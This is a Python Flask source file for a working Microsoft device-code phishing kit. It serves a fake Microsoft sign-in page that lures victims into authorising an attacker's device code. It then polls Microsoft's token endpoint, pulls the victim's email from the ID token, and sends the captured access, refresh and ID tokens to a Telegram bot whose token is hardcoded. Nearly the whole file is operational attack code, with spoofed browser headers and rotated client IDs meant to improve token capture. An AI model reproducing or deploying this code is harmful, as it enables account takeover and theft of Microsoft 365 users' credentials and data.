import os
import uuid
import time
import json
import sqlite3
import threading
import base64
import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

DB_PATH = "/tmp/phish.db"
BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
CHAT_ID = "8877118461"

# Scopes that trigger web-session cookies
GRAPH_SCOPE = "openid profile offline_access https://graph.microsoft.com/.default"

# Client IDs rotated for better cookie capture
# Office and OneDrive are more likely to return ESTSAUTH than Azure CLI
CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (Web)
    "ab9b8c07-8f02-4f72-8fa3-459cc3d94c57",  # OneDrive Sync
    "04b07795-8ddb-4619-b003-b6536909d649",  # Azure CLI
    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
]

MFA_DEVICES = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

_db_lock = threading.Lock()
_active_polls = set()
_poll_guard = threading.Lock()

def get_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=10)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        client_id TEXT,
        device_code TEXT,
        user_code TEXT,
        interval INTEGER,
        expires_at REAL,
        status TEXT,
        tokens TEXT,
        notified INTEGER DEFAULT 0
    )""")
    conn.commit()
    return conn

def db_query(query, params=(), fetch=False):
    with _db_lock:
        conn = get_db()
        try:
            cur = conn.execute(query, params)
            rows = cur.fetchall() if fetch else None
            conn.commit()
            return rows
        finally:
            conn.close()

def send_telegram(text):
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=15,
        )
        print(f"[TELEGRAM] status={r.status_code}")
    except Exception as e:
        print(f"[TELEGRAM ERROR] {e}")

def start_session():
    for client_id in CLIENT_IDS:
        try:
            # Use a browser-like User-Agent for the device code request
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "application/json",
            }
            r = requests.post(MFA_DEVICES, data={
                "client_id": client_id,
                "scope": GRAPH_SCOPE,
            }, headers=headers, timeout=15)
            data = r.json()
        except Exception as e:
            print(f"[FLOW ERROR] {e}")
            continue
        
        if "device_code" in data:
            sid = str(uuid.uuid4())
            interval = data.get("interval", 5)
            expires_at = time.time() + data.get("expires_in", 900)
            db_query(
                "INSERT INTO sessions (session_id, client_id, device_code, user_code, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
                (sid, client_id, data["device_code"], data["user_code"], interval, expires_at, "pending"),
            )
            spawn_poll(sid)
            print(f"[FLOW OK] client={client_id} user_code={data['user_code']}")
            return {"session_id": sid, "user_code": data["user_code"]}
        print(f"[FLOW FAIL] client={client_id} -> {data.get('error')}: {data.get('error_description','')[:150]}")
    return None

def spawn_poll(session_id):
    with _poll_guard:
        if session_id in _active_polls:
            return
        _active_polls.add(session_id)
    t = threading.Thread(target=poll_session, args=(session_id,), daemon=True)
    t.start()

def poll_session(session_id):
    try:
        rows = db_query(
            "SELECT client_id, device_code, interval, expires_at FROM sessions WHERE session_id=?",
            (session_id,), fetch=True
        )
        if not rows:
            print(f"[POLL] no row for {session_id}")
            return
        client_id, device_code, interval, expires_at = rows[0]
        interval = interval or 5
        print(f"[POLL] started sid={session_id} client={client_id}")

        while time.time() < expires_at:
            time.sleep(interval)
            try:
                # Mimic browser headers for token request too
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "application/json",
                }
                r = requests.post(TOKEN_URL, data={
                    "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                    "client_id": client_id,
                    "device_code": device_code,
                }, headers=headers, timeout=15)
                data = r.json()
            except Exception as e:
                print(f"[POLL ERROR] request: {e}")
                continue

            err = data.get("error")
            if err == "authorization_pending":
                continue
            if err == "slow_down":
                interval += 5
                continue
            if err:
                print(f"[POLL] error {err}: {data.get('error_description','')}")
                db_query("UPDATE sessions SET status=? WHERE session_id=?", (f"error:{err}", session_id))
                return

            print("[POLL] TOKEN RECEIVED")
            tokens = json.dumps(data)
            db_query("UPDATE sessions SET status='done', tokens=? WHERE session_id=?", (tokens, session_id))

            victim = "unknown"
            try:
                payload = data.get("id_token", "").split(".")[1]
                payload += "=" * (-len(payload) % 4)
                claims = json.loads(base64.urlsafe_b64decode(payload))
                victim = claims.get("preferred_username") or claims.get("upn") or claims.get("email") or "unknown"
            except Exception as e:
                print(f"[POLL] id_token parse failed: {e}")

            # Format Telegram Message
            msg = (
                f"🎯 <b>NEW CAPTURE</b>\n"
                f"👤 <b>Email:</b> <code>{victim}</code>\n"
                f"🆔 <b>Client:</b> <code>{client_id}</code>\n\n"
                f"🔑 <b>Access Token:</b>\n<code>{data.get('access_token', '')}</code>\n\n"
                f"🔄 <b>Refresh Token:</b>\n<code>{data.get('refresh_token', '')}</code>\n\n"
                f"📄 <b>ID Token:</b>\n<code>{data.get('id_token', '')}</code>"
            )
            send_telegram(msg)
            db_query("UPDATE sessions SET notified=1 WHERE session_id=?", (session_id,))
            return

        print(f"[POLL] expired sid={session_id}")
        db_query("UPDATE sessions SET status='expired' WHERE session_id=?", (session_id,))
    except Exception as e:
        print(f"[POLL FATAL] {e}")
    finally:
        with _poll_guard:
            _active_polls.discard(session_id)

def resume_pending():
    try:
        rows = db_query(
            "SELECT session_id FROM sessions WHERE status='pending' AND expires_at > ?",
            (time.time(),), fetch=True
        )
        for (sid,) in rows:
            spawn_poll(sid)
        if rows:
            print(f"[POLL] resumed {len(rows)} pending session(s)")
    except Exception as e:
        print(f"[POLL] resume failed: {e}")

PAGE = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;max-width:440px;width:100%;padding:44px;margin:20px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:400;color:#1b1b1b;margin:0 0 16px}
.code{font-size:28px;letter-spacing:4px;font-weight:600;color:#0067b8;margin:16px 0}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:16px}
button:hover{background:#005da6}
p{font-size:13px;color:#1b1b1b;line-height:1.5}
</style></head>
<body><div class="card">
<h1>Enter this code to sign in</h1>
<p>Copy this code, then click the button below to finish signing in:</p>
<div class="code">{{ user_code }}</div>
<button onclick="go()">Copy code and continue</button>
<p id="msg"></p>
</div>
<script>
function go(){
  var c=document.querySelector('.code').innerText.trim();
  if(navigator.clipboard){navigator.clipboard.writeText(c);}
  document.getElementById('msg').innerText='Code copied. Complete sign-in on the next screen.';
  setTimeout(function(){window.location.href='https://microsoft.com/devicelogin';},900);
}
</script>
</body></html>"""

@app.route("/")
def index():
    result = start_session()
    if not result:
        return "Service temporarily unavailable. Please refresh the page.", 502
    return render_template_string(PAGE, user_code=result["user_code"])

@app.route("/create-session")
def create_session():
    result = start_session()
    if not result:
        return jsonify({"error": "all_clients_failed"}), 502
    return jsonify(result)

@app.route("/status/<session_id>")
def status(session_id):
    rows = db_query("SELECT status FROM sessions WHERE session_id=?", (session_id,), fetch=True)
    if not rows:
        return jsonify({"status": "unknown"})
    return jsonify({"status": rows[0][0]})

resume_pending()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
